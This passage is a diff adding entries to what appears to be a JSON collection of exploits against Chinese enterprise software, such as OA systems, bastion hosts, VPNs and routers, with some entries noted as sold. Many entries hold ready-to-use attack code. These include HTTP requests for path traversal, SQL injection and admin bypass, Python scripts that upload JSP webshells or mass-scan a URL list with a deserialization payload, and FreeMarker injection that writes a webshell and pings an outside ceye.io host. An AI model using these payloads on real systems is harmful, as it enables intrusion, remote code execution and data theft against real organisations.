+  "poc": "GET /webconf/GetFile/index?path=../../../../../../../etc/passwd HTTP/1.1 Host: Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36 Connection: close",
+  "label": "1day"
+ },
+ {
+  "vendor": "致远",
+  "name": "致远 Seeyon OA wpsAssistServlet 接口任意文件上传漏洞",
+  "type": "任意文件上传",
+  "source": "公众号",
+  "info": "",
+  "date": "08.10",
+  "poc": "POST /seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/de.jsp&fileId=2 HTTP/1.1 Host: User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36 Accept: */* Referer: Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: JSESSIONID=5C25EFEF65A2B6A4C12848B88EA60639; loginPageURL= Content-Type: multipart/form-data; boundary=59229605f98b8cf290a7b8908b34616b Accept-Encoding: gzip Connection: close Content-Length: 208 --59229605f98b8cf290a7b8908b34616b Content-Disposition: form-data; name=\"upload\"; filename=\"123.xls\" Content-Type: application/vnd.ms-excel <% out.println(\"xxxx\");%> --59229605f98b8cf290a7b8908b34616b--",
+  "label": "nday"
+ },
+ {
+  "vendor": "致远",
+  "name": "致远OA任意管理员登录",
+  "type": "认证绕过",
+  "source": "公众号",
+  "info": "获取到管理员cookie，将其进行替换",
+  "date": "08.10",
+  "poc": "POST /seeyon/thirdpartyController.do HTTP/1.1 method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04%2BLjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1",
+  "label": "nday"
+ },
+ {
+  "vendor": "辰信景云",
+  "name": "辰信景云终端安全管理系统 login SQL注入漏洞",
+  "type": "SQL注入",
+  "source": "公众号",
+  "info": "",
+  "date": "08.10",
+  "poc": "POST /api/user/login captcha=&password=21232f297a57a5a743894a0e4a801fc3&username=admin'and(select*from(select+sleep(3))a)='",
+  "label": "1day"
+ },
+ {
+  "vendor": "锐捷",
+  "name": "锐捷 RG-BCR860 后台命令注入",
+  "type": "RCE",
+  "source": "公众号",
+  "info": "CVE-2023-3450",
+  "date": "08.10",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "锐捷",
+  "name": "锐捷网络 RG-EW1200G 无线路由器存在密码重置漏洞",
+  "type": "认证绕过",
+  "source": "微信",
+  "info": "/api/sys/set_passwd HWR_1.0(1)B1P5, Release(07161417) r483",
+  "date": "08.10",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "DzzOffice",
+  "name": "协同办公文档未授权访问",
+  "type": "认证绕过",
+  "source": "微信",
+  "info": "据说攻击队利用此0day已打穿上海某单位 不保真",
+  "date": "08.09",
+  "poc": "",
+  "label": "1day"
+ },
+ {
+  "vendor": "easysite",
+  "name": "easysite",
+  "type": "未知",
+  "source": "某司售卖",
+  "info": "",
+  "date": "08.09",
+  "poc": "",
+  "label": "未知"
+ },
+ {
+  "vendor": "fastjson",
+  "name": "fastjson反序列化",
+  "type": "反序列化",
+  "source": "微信群",
+  "info": "fastjson<2.0.27 建议升级至>=2.0.27",
+  "date": "08.09",
+  "poc": "暂无",
+  "label": "0day"
+ },
+ {
+  "vendor": "H3C",
+  "name": "H3Ccas保垒机任意文件上传",
+  "type": "任意文件上传",
+  "source": "某司售卖",
+  "info": "/%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86_files/cas/fileUpload/upload?token=/../../../../../var/lib/tomcat8/webapps/cas/js/lib/buttons/odtvywmf.jsp&name=",
+  "date": "08.09",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "interlib",
+  "name": "interlib图书管集群系统V2.01",
+  "type": "未知",
+  "source": "某司售卖",
+  "info": "",
+  "date": "08.09",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "totolink",
+  "name": "totolink<=V5.3c5507",
+  "type": "未知",
+  "source": "某司售卖",
+  "info": "",
+  "date": "08.09",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "中元麒麟",
+  "name": "中元麒麟堡垒机rce",
+  "type": "RCE",
+  "source": "某司售卖、RCE",
+  "info": "麒麟堡垒机用于运维管理的认证、授权、审计等监控管理。中远麒麟堡垒机存在SQL注入，可利用该漏洞获取系统敏感信息。",
+  "date": "08.09",
+  "poc": "cert=\"Baolei\"||title=\"麒麟堡垒机\"||body=\"admin.php?controller=admin_index&action=get_user_login_fristauth\"||body=\"admin.php?controller=admin_index&action=login\" poc: relative: req0 && req1 session: false requests: - method: POST timeout: 10 path: /admin.php?controller=admin_commonuser headers: Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.2786.81 Safari/537.36 data: username=admin' AND (SELECT 6999 FROM (SELECT(SLEEP(5)))ptGN) AND 'AAdm'='AAdm follow_redirects: true matches: (code.eq(\"200\") && time.gt(\"5\") && time.lt(\"10\")) - method: POST timeout: 10 path: /admin.php?controller=admin_commonuser headers: User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.2786.81 Safari/537.36 Content-Type: application/x-www-form-urlencoded data: username=admin follow_redirects: true matches: time.lt(\"5\")",
+  "label": "nday"
+ },
+ {
+  "vendor": "中科博华",
+  "name": "博华网龙防火墙",
+  "type": "未知",
+  "source": "某司售卖",
+  "info": "",
+  "date": "08.09",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "久科",
+  "name": "any800部分版本rce",
+  "type": "RCE",
+  "source": "某司售卖",
+  "info": "",
+  "date": "08.09",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "亿赛通",
+  "name": "亿赛通电子文档平台文件上传漏洞",
+  "type": "任意文件上传",
+  "source": "微信",
+  "info": "今年新洞",
+  "date": "08.09",
+  "poc": "import requests from urllib.parse import urljoin import sys payload=\"/CDGServer3/fileType/importFileType.do?flag=syn_user_policy\" request_file = {'fileshare':(('/..\\..\\..\\..\\webapps\\ROOT\\\\tool.jsp',\"\"\"<%! class U extends ClassLoader { U(ClassLoader c) { super(c); } public Class g(byte[] b) { return super.defineClass(b, 0, b.length); } } public byte[] base64Decode(String str) throws Exception { try { Class clazz = Class.forName(\"sun.misc.BASE64Decoder\"); return (byte[]) clazz.getMethod(\"decodeBuffer\", String.class).invoke(clazz.newInstance(), str); } catch (Exception e) { Class clazz = Class.forName(\"java.util.Base64\"); Object decoder = clazz.getMethod(\"getDecoder\").invoke(null); return (byte[]) decoder.getClass().getMethod(\"decode\", String.class).invoke(decoder, str); } } %> <% String cls = request.getParameter(\"passwd\"); if (cls != null) { new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext); } %>\"\"\"))} def title(): print(\"\"\" 亿赛通文件上传 \"\"\") def exp(url): url1=urljoin(url,payload) req=requests.post(url=url1,files=request_file,verify=False,timeout=5) shell=urljoin(url,\"tool.jsp\") if(req.text.find(\"xmlFail\")>0): print(\"成功！\") print(\"蚁剑连接地址%s,密码passwd\"%shell) if __name__ == '__main__': title if(len(sys.argv) !=2): print(\"eg:python exp.py url\") else: exp(sys.argv[1])",
+  "label": "1day"
+ },
+ {
+  "vendor": "佰鼎",
+  "name": "佰鼎OA",
+  "type": "未知",
+  "source": "某司售卖",
+  "info": "",
+  "date": "08.09",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "华为",
+  "name": "anyoffice部分版本",
+  "type": "未知",
+  "source": "某司售卖",
+  "info": "",
+  "date": "08.09",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "华天动力",
+  "name": "华天动力系统RCE",
+  "type": "RCE",
+  "source": "某司售卖",
+  "info": "",
+  "date": "08.09",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "博采",
+  "name": "bocadmin",
+  "type": "RCE",
+  "source": "某司售卖",
+  "info": "",
+  "date": "08.09",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "合勤",
+  "name": "zyxelQAP003-3.60.3.09.91-PK5000",
+  "type": "未知",
+  "source": "某司售卖",
+  "info": "",
+  "date": "08.09",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "合勤",
+  "name": "zyxelUSG FireWall V3.31",
+  "type": "未知",
+  "source": "某司售卖",
+  "info": "",
+  "date": "08.09",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "合勤",
+  "name": "zyxelVMG3925V5.13(AAVF13)C0",
+  "type": "未知",
+  "source": "某司售卖",
+  "info": "",
+  "date": "08.09",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "启明",
+  "name": "天玥堡垒机0day",
+  "type": "RCE",
+  "source": "社群",
+  "info": "无详细信息",
+  "date": "08.09",
+  "poc": "",
+  "label": "0day"
+ },
+ {
+  "vendor": "嘉扬",
+  "name": "嘉扬 erp 文件上传",
+  "type": "未知",
+  "source": "某司售卖",
+  "info": "/LoginxSSO.aspx?Account=r4ZlDE33VVpnPnaq2dKUEg==",
+  "date": "08.09",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "奇安信",
+  "name": "奇安信VPN RCE",
+  "type": "RCE",
+  "source": "微信",
+  "info": "端口PWN",
+  "date": "08.09",
+  "poc": "",
+  "label": "1day"
+ },
+ {
+  "vendor": "奇安信",
+  "name": "奇安信天眼RCE",
+  "type": "RCE",
+  "source": "社群",
+  "info": "售价30w已有红队购买",
+  "date": "08.09",
+  "poc": "",
+  "label": "1day"
+ },
+ {
+  "vendor": "契约锁",
+  "name": "契约锁电子签章系统RCE",
+  "type": "RCE",
+  "source": "微信",
+  "info": "上海某行动期间已修复",
+  "date": "08.09",
+  "poc": "POST /callback/%2E%2E;/code/upload HTTP/1.1 Host: 103.242.174.137:9180 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Origin: https://103.242.174.137:9180 Referer: https://103.242.174.137:9180 X-Requested-With: XMLHttpRequest Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryco2lQ5vxCOn9Aq2R Connection: close ------WebKitFormBoundaryco2lQ5vxCOn9Aq2R Content-Disposition: form-data; name=\"type\"; TIMETASK ------WebKitFormBoundaryco2lQ5vxCOn9Aq2R Content-Disposition: form-data; name=\"file\";filename=\"qys.jpg\" package qiyuesuo; import com.qiyuesuo.utask.java.BaseTimerTask; public class qiyuesuo004 extends BaseTimerTask { static {try{Runtime.getRuntime().exec(\"whoami\");}catch (Exception e){}} } ------WebKitFormBoundaryco2lQ5vxCOn9Aq2R--",
+  "label": "nday"
+ },
+ {
+  "vendor": "奥联",
+  "name": "奥联APNGW系列IPSECVPN",
+  "type": "未知",
+  "source": "某司售卖",
+  "info": "",
+  "date": "08.09",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "安恒",
+  "name": "安恒明御堡垒机(1day)任意用户注册",
+  "type": "认证绕过",
+  "source": "某司售卖",
+  "info": "CNVD-2023-03898",
+  "date": "08.09",
+  "poc": "POST /service/?unix:/../../../../var/run/rpc/xmlrpc.sock|http://test/wsrpc HTTP/1.1Host: xxxCookie: LANG=zh; USM=0a0e1f29d69f4b9185430328b44ad990832935dbf1b90b8769d297dd9f0eb848Cac he-Control: max-age=0Sec-Ch-Ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"100\", \"Google Chrome\";v=\"100\"Sec-Ch-Ua-Mobile: ?0Sec-Ch- Ua-Platform: \"Windows\"Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/ webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Sec- Fetch-Site: noneSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch- Dest: documentAccept-Encoding: gzip, deflateAccept-Language: zh- CN,zh;q=0.9Connection: closeContent-Length: 1121 <?xml version=\"1.0\"?><methodCall><methodName>web.user_add</methodName><params ><param><value><array><data><value><string>admin</string></value><value ><string>5</string></value><value><string>XX.XX.XX.XX</string></value>< /data></array></value></param><param><value><struct><member><name>uname </name><value><string>deptadmin</string></value></member><member><name> name</name><value><string>deptadmin</string></value></member><member><n ame>pwd</name><value><string>Deptadmin@123</string></value></member><me mber><name>authmode</name><value><string>1</string></value></member><me mber><name>deptid</name><value><string></string></value></member><membe r><name>email</name><value><string></string></value></member><member><n ame>mobile</name><value><string></string></value></member><member><name >comment</name><value><string></string></value></member><member><name>r oleid</name><value><string>101</string></value></member></struct></valu e></param></params></methodCall>",
+  "label": "1day"
+ },
+ {
+  "vendor": "帆软",
+  "name": "帆软channel序列化",
+  "type": "反序列化",
+  "source": "微信",
+  "info": "/webroot/decision/remote/design/channel header存在Testdmc参数、Testecho参数",
+  "date": "08.09",
+  "poc": "#!/usr/bin/env python # -*- conding:utf-8 -*- # 帆软channel接口反序列化 # Author: SXdysq import base64 import requests import urllib3 import concurrent.futures urllib3.disable_warnings() headers = { \"Pragma\": \"no-cache\", \"Cache-Control\": \"no-cache\", \"Upgrade-Insecure-Requests\": \"1\", \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\", \"Accept-Language\": \"zh-CN,zh;q=0.9\", \"Connection\": \"close\", } def check(host): try: burp0_url = host + \"/webroot/decision/remote/design/channel\" req = requests.get(burp0_url, headers=headers, verify=False, timeout=3) if \"method 'GET' not supported\" in req.text: req = requests.post(burp0_url, headers=headers, verify=False, timeout=3) if \"如需访问请联系管理员\" not in req.text: cmd(host) else: print(\"[o]\", host, \"------不存在漏洞！\") else: print(\"[o]\", host, \"------不存在漏洞！\") except Exception as e: print(\"[o]\", host, \"------不存在漏洞！\") def cmd(host): try: burp0_url = host + \"/webroot/decision/remote/design/channel\" burp0_headers = {\"Content-Type\": \"application/x-www-form-urlencoded\", \"Testdmc\": \"whoami\", \"Testecho\": \"TestEcho\"} b = b\"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\" burp0_data = base64.b64decode(b) res = requests.post(burp0_url, headers=burp0_headers, data=burp0_data, verify=False, timeout=3) if res.status_code == 200 and 'Testdmc' in res.headers and res.headers['Testdmc']: testdmc_value = res.headers['Testdmc'] print(\"[+]\", host, \"------存在漏洞！\") print(\"Testdmc的值为：\", base64.b64decode(testdmc_value).decode('utf-8')) else: print(\"[o]\", host, \"------不存在漏洞！\") except Exception as e: print(\"[o]\", host, \"------不存在漏洞！\") if __name__ == '__main__': with open('urls.txt', 'r') as file: hosts = [line.strip() for line in file] with concurrent.futures.ThreadPoolExecutor() as executor: executor.map(check, hosts)",
+  "label": "1day"
+ },
+ {
+  "vendor": "新开普",
+  "name": "新开普智慧校园系统代码执行漏洞",
+  "type": "RCE",
+  "source": "某司售卖、TG",
+  "info": "新开普智慧校园系统/service_transport/service.action接口处存在FreeMarker模板注入，攻击者可在未经身份认证的情况下，调用后台接口，构造恶意代码实现远程代码执行，最终可造成服务器失陷。 路径存在则漏洞存在 http://xxx.com/service_transport/service.action",
+  "date": "08.09",
+  "poc": "poc没回显 POST /service_transport/service.action HTTP/1.1 Host: your-ip Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Cookie: JSESSIONID=6A13B163B0FA9A5F8FE53D4153AC13A4 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0 { \"command\": \"GetFZinfo\", \"UnitCode\": \"<#assign ex = \\\"freemarker.template.utility.Execute\\\"?new()>${ex(\\\"cmd /c ping v0u26h.ceye.io\\\")}\" } 纯文本 写文件 POST /service_transport/service.action HTTP/1.1 Host: your-ip Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Cookie: JSESSIONID=6A13B163B0FA9A5F8FE53D4153AC13A4 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0 { \"command\": \"GetFZinfo\", \"UnitCode\": \"<#assign ex = \\\"freemarker.template.utility.Execute\\\"?new()>${ex(\\\"cmd /c echo PCUhCiAgICBjbGFzcyBVIGV4dGVuZHMgQ2xhc3NMb2FkZXIgewogICAgICAgIFUoQ2xhc3NMb2FkZXIgYykgewogICAgICAgICAgICBzdXBlcihjKTsKICAgICAgICB9CiAgICAgICAgcHVibGljIENsYXNzIGcoYnl0ZVtdIGIpIHsKICAgICAgICAgICAgcmV0dXJuIHN1cGVyLmRlZmluZUNsYXNzKGIsIDAsIGIubGVuZ3RoKTsKICAgICAgICB9CiAgICB9CiAKICAgIHB1YmxpYyBieXRlW10gYmFzZTY0RGVjb2RlKFN0cmluZyBzdHIpIHRocm93cyBFeGNlcHRpb24gewogICAgICAgIHRyeSB7CiAgICAgICAgICAgIENsYXNzIGNsYXp6ID0gQ2xhc3MuZm9yTmFtZSgic3VuLm1pc2MuQkFTRTY0RGVjb2RlciIpOwogICAgICAgICAgICByZXR1cm4gKGJ5dGVbXSkgY2xhenouZ2V0TWV0aG9kKCJkZWNvZGVCdWZmZXIiLCBTdHJpbmcuY2xhc3MpLmludm9rZShjbGF6ei5uZXdJbnN0YW5jZSgpLCBzdHIpOwogICAgICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiBlKSB7CiAgICAgICAgICAgIENsYXNzIGNsYXp6ID0gQ2xhc3MuZm9yTmFtZSgiamF2YS51dGlsLkJhc2U2NCIpOwogICAgICAgICAgICBPYmplY3QgZGVjb2RlciA9IGNsYXp6LmdldE1ldGhvZCgiZ2V0RGVjb2RlciIpLmludm9rZShudWxsKTsKICAgICAgICAgICAgcmV0dXJuIChieXRlW10pIGRlY29kZXIuZ2V0Q2xhc3MoKS5nZXRNZXRob2QoImRlY29kZSIsIFN0cmluZy5jbGFzcykuaW52b2tlKGRlY29kZXIsIHN0cik7CiAgICAgICAgfQogICAgfQolPgo8JQogICAgU3RyaW5nIGNscyA9IHJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJwYXNzd2QiKTsKICAgIGlmIChjbHMgIT0gbnVsbCkgewogICAgICAgIG5ldyBVKHRoaXMuZ2V0Q2xhc3MoKS5nZXRDbGFzc0xvYWRlcigpKS5nKGJhc2U2NERlY29kZShjbHMpKS5uZXdJbnN0YW5jZSgpLmVxdWFscyhwYWdlQ29udGV4dCk7CiAgICB9CiU+ >./webapps/ROOT/1.txt\\\")}\" } 纯文本 文件转换为jsp POST /service_transport/service.action HTTP/1.1 Host: your-ip Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Cookie: JSESSIONID=6A13B163B0FA9A5F8FE53D4153AC13A4 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0 { \"command\": \"GetFZinfo\", \"UnitCode\": \"<#assign ex = \\\"freemarker.template.utility.Execute\\\"?new()>${ex(\\\"cmd /c certutil -decode ./webapps/ROOT/1.txt ./webapps/ROOT/1.jsp\\\")}\" }",
+  "label": "nday"
+ },
+ {
+  "vendor": "易通",
+  "name": "cmseasy RCE",
+  "type": "未知",
+  "source": "某司售卖",
+  "info": "",
+  "date": "08.09",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "普元",
+  "name": "普元EOS前台代码执行漏洞",
+  "type": "RCE",
+  "source": "微信",
+  "info": "漏洞较多",
+  "date": "08.09",
